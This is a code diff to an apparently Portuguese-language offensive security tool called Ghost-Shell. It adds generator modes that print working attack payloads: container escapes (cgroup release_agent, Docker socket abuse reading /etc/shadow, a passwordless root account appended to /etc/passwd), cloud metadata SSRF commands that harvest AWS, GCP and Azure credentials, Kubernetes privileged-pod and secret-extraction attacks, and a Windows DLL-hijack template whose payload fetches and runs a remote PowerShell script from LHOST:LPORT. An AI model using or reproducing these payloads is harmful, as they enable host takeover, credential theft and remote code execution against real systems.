@@ -43,7 +43,7 @@ try:
 except ImportError:
     pass
 
-VERSAO = "2.2.0"
+VERSAO = "2.3.0"
 
 
 def _build_banner():
@@ -1631,6 +1631,203 @@ services:
 
 
 # ==============================================================================
+# Container Escape Payloads
+# ==============================================================================
+
+def gerar_container_escape():
+    _secao("CONTAINER ESCAPE PAYLOADS")
+    G = C["G"]; Y = C["Y"]; N = C["N"]; X = C["X"]; CY = C["C"]
+
+    print(f"""
+{CY}{N}  1. cgroup notify_on_release (privileged container){X}
+{G}# Requer: container privilegiado ou CAP_SYS_ADMIN
+# Executa cmd no host via cgroup release_agent
+mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x
+echo 1 > /tmp/cgrp/x/notify_on_release
+host_path=$(sed -n 's/.*\\perdir=\\([^,]*\\).*/\\1/p' /proc/mounts)
+echo "$host_path/cmd" > /tmp/cgrp/release_agent
+echo '#!/bin/sh' > /cmd
+echo 'ps aux > /tmp/out.txt' >> /cmd
+chmod a+x /cmd
+sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
+# Output in /tmp/out.txt{X}
+
+{CY}{N}  2. procfs host process exec (container with /proc/sysrq-trigger){X}
+{G}# Requer: acesso ao procfs do host montado no container
+# Executa via /proc/<host_pid>/fd escrita ou /proc/sysrq-trigger
+cat /proc/1/cmdline   # confirma se PID 1 do host esta visivel
+nsenter -t 1 -m -u -i -n /bin/bash  # escape via nsenter{X}
+
+{CY}{N}  3. Docker socket abuse (/var/run/docker.sock gravavel){X}
+{G}# Cria novo container com volume / do host para leitura/escrita total
+docker run -v /:/mnt/host --rm -it alpine chroot /mnt/host /bin/bash
+# Ou via API REST (sem docker CLI):
+curl --unix-socket /var/run/docker.sock -X POST \\
+  http://localhost/containers/create \\
+  -H 'Content-Type: application/json' \\
+  -d '{{"Image":"alpine","Cmd":["/bin/sh","-c","cat /mnt/host/etc/shadow"],"Binds":["/:/mnt/host"],"Privileged":true}}'
+curl --unix-socket /var/run/docker.sock -X POST http://localhost/containers/<id>/start{X}
+
+{CY}{N}  4. Writable /etc/passwd in container (host bind-mount){X}
+{G}# Se /etc/passwd for um bind-mount do host e gravavel:
+echo 'ghost::0:0:root:/root:/bin/bash' >> /etc/passwd
+# Depois: su ghost (sem senha, uid=0){X}
+
+{CY}{N}  5. Docker escape via --pid=host{X}
+{G}# Se o container tem --pid=host, pode ver e matar processos do host
+# Inject shellcode via /proc/<pid>/mem (requer ptrace ou CAP_SYS_PTRACE)
+nsenter -t 1 -m -- /bin/bash{X}
+""")
+
+
+# ==============================================================================
+# Cloud SSRF -> IMDS Shell (169.254.169.254)
+# ==============================================================================
+
+def gerar_imds_ssrf(provedor: str = "aws"):
+    _secao(f"CLOUD SSRF -> IMDS ({provedor.upper()})")
+    G = C["G"]; Y = C["Y"]; N = C["N"]; X = C["X"]; CY = C["C"]
+
+    if provedor == "aws":
+        print(f"""
+{CY}{N}  AWS IMDSv1 - sem token, leitura direta:{X}
+{G}# SSRF para 169.254.169.254 (IMDSv1 - sem cabecalho X-aws-ec2-metadata-token)
+curl http://169.254.169.254/latest/meta-data/
+curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
+# Obter nome do IAM role:
+ROLE=$(curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/)
+# Obter credenciais temporarias:
+curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/$ROLE
+# Resultado: AccessKeyId, SecretAccessKey, Token -> usar com AWS CLI{X}
+
+{CY}{N}  AWS IMDSv2 - requer token (PUT first):{X}
+{G}TOKEN=$(curl -s -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
+curl -s -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/iam/security-credentials/{X}
+
+{CY}{N}  User-data (pode conter secrets/init scripts):{X}
+{G}curl http://169.254.169.254/latest/user-data{X}
+""")
+    elif provedor == "gcp":
+        print(f"""
+{CY}{N}  GCP Metadata Server:{X}
+{G}curl -H "Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1/
+curl -H "Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
+curl -H "Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1/project/project-id
+# Token de service account -> gcloud auth ativate-service-account{X}
+""")
+    elif provedor == "azure":
+        print(f"""
+{CY}{N}  Azure IMDS:{X}
+{G}curl -s -H Metadata:true "http://169.254.169.254/metadata/instance?api-version=2021-02-01"
+# Obter token MSI (Managed Service Identity):
+curl -s -H Metadata:true "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"
+# Token -> Authorization: Bearer <token> em chamadas ARM API{X}
+""")
+    else:
+        _log(f"Provedor desconhecido: {provedor}. Use aws, gcp ou azure.", "ERRO")
+
+
+# ==============================================================================
+# Kubernetes Escape Payloads
+# ==============================================================================
+
+def gerar_k8s_escape():
+    _secao("KUBERNETES ESCAPE PAYLOADS")
+    G = C["G"]; Y = C["Y"]; N = C["N"]; X = C["X"]; CY = C["C"]
+
+    print(f"""
+{CY}{N}  1. kubectl exec (se permissao pods/exec existir):{X}
+{G}kubectl auth can-i create pod --all-namespaces
+kubectl auth can-i get pods --all-namespaces
+# Se sim, crie um pod privilegiado:
+kubectl run pwn --image=alpine --restart=Never -it --rm --overrides='{{
+  "spec":{{"containers":[{{"name":"pwn","image":"alpine",
+    "securityContext":{{"privileged":true}},
+    "volumeMounts":[{{"mountPath":"/host","name":"host"}}]}}],
+  "volumes":[{{"name":"host","hostPath":{{"path":"/"}}}}]}}}}' -- chroot /host /bin/bash{X}
+
+{CY}{N}  2. Service Account token abuse:{X}
+{G}cat /var/run/secrets/kubernetes.io/serviceaccount/token
+APISERVER=https://kubernetes.default.svc
+TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
+# Listar pods:
+curl -s $APISERVER/api/v1/namespaces/default/pods -H "Authorization: Bearer $TOKEN" --insecure
+# Criar pod privilegiado via API:
+curl -s -X POST $APISERVER/api/v1/namespaces/default/pods \\
+  -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" \\
+  --insecure -d @/tmp/pod_escape.json{X}
+
+{CY}{N}  3. hostPID + nsenter:{X}
+{G}# Se o pod tem hostPID: true:
+nsenter -t 1 -m -u -i -n -p -- bash{X}
+
+{CY}{N}  4. etcd direct access (sem autenticacao):{X}
+{G}# Se etcd porta 2379 acessivel sem TLS:
+curl http://<etcd_ip>:2379/v3/keys/registry/secrets/default
+# Extrai SA tokens, secrets do cluster{X}
+
+{CY}{N}  5. kube-apiserver anonymous auth:{X}
+{G}curl -k https://<apiserver>:6443/api/v1/namespaces/kube-system/secrets
+curl -k https://<apiserver>:6443/api/v1/nodes{X}
+""")
+
+
+# ==============================================================================
+# DLL Hijacking Templates
+# ==============================================================================
+
+def gerar_dll_hijack(nome_dll: str = "version.dll"):
+    _secao(f"DLL HIJACKING TEMPLATE - {nome_dll}")
+    G = C["G"]; N = C["N"]; X = C["X"]; CY = C["C"]
+
+    c_template = f"""// DLL Hijack: {nome_dll}
+// By Gh0st-Bx1 | github.com/Ghost-Bx1
+// Compile: x86_64-w64-mingw32-gcc -shared -o {nome_dll} dll_hijack.c -lws2_32
+#include <windows.h>
+#include <winsock2.h>
+
+void Payload() {{
+    // ---- Customize: reverse shell, exec, etc. ----
+    STARTUPINFOA si = {{0}}; PROCESS_INFORMATION pi = {{0}};
+    si.cb = sizeof(si);
+    CreateProcessA(NULL, "cmd.exe /c powershell -nop -w hidden -c IEX(New-Object Net.WebClient).DownloadString('http://LHOST:LPORT/s.ps1')",
+        NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
+}}
+
+BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved) {{
+    if (fdwReason == DLL_PROCESS_ATTACH) {{
+        DisableThreadLibraryCalls(hinstDLL);
+        CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Payload, NULL, 0, NULL);
+    }}
+    return TRUE;
+}}
+"""
+
+    print(f"{G}{c_template}{X}")
+
+    print(f"""
+{CY}{N}  Locais comuns para DLL hijacking:{X}
+{G}# 1. Pasta do executavel gravavel (DLL search order abuse)
+#    Coloque {nome_dll} no mesmo diretorio do .exe alvo
+# 2. Pasta no PATH do sistema gravavel
+#    where {nome_dll.split('.')[0]}  # encontra onde Windows procura
+# 3. Scheduled task / servico que carrega DLL com path sem aspas
+#    sc qc <service_name>  # verifica BinaryPathName sem aspas
+# 4. Missing DLL (Procmon filter: "NAME NOT FOUND" + ".dll")
+#    Procmon -> Filter -> Result = NAME NOT FOUND, Path ends with .dll{X}
+
+{CY}{N}  Compilacao rapida (mingw):{X}
+{G}x86_64-w64-mingw32-gcc -shared -o {nome_dll} dll_hijack.c -lws2_32
+# 32-bit:
+i686-w64-mingw32-gcc -shared -o {nome_dll} dll_hijack.c -lws2_32{X}
+
+{CY}{N}  DLLs comuns vulneraveis a hijack:{X}
+  version.dll  wtsapi32.dll  winmm.dll  uxtheme.dll  cryptsp.dll
+  dbghelp.dll  apphelp.dll   dwmapi.dll  profapi.dll  userenv.dll
+""")
+
+
+# ==============================================================================
 # CLI
 # ==============================================================================
 
@@ -1744,6 +1941,22 @@ def main():
 
     # Modo HOLLOW
     sub.add_parser("hollow", help="Gerar template C de process hollowing com shellcode injection")
+
+    # Modo CONTAINER
+    sub.add_parser("container", help="Payloads de escape de container (cgroup, docker.sock, procfs)")
+
+    # Modo IMDS
+    p_imds = sub.add_parser("imds", help="Cloud SSRF via IMDS - obter credenciais IAM/MSI/SA token")
+    p_imds.add_argument("--cloud", choices=["aws", "gcp", "azure"], default="aws",
+                        help="Provedor cloud (padrao: aws)")
+
+    # Modo K8S
+    sub.add_parser("k8s", help="Kubernetes escape payloads (pod privilegiado, SA token, etcd, hostPID)")
+
+    # Modo DLL
+    p_dll = sub.add_parser("dll", help="Template C de DLL hijacking para Windows")
+    p_dll.add_argument("--nome", default="version.dll",
+                       help="Nome da DLL alvo (padrao: version.dll)")
 
     parser.add_argument("--no-banner", action="store_true", help="Suprimir banner")
 
@@ -1868,6 +2081,18 @@ def main():
 
     elif args.modo == "hollow":
         gerar_process_hollow()
+
+    elif args.modo == "container":
+        gerar_container_escape()
+
+    elif args.modo == "imds":
+        gerar_imds_ssrf(provedor=args.cloud)
+
+    elif args.modo == "k8s":
+        gerar_k8s_escape()
+
+    elif args.modo == "dll":
+        gerar_dll_hijack(nome_dll=args.nome)
 
     print(f"\n  {C['G']}{C['N']}[+] Ghost-Shell finalizado.{C['X']}\n")
 
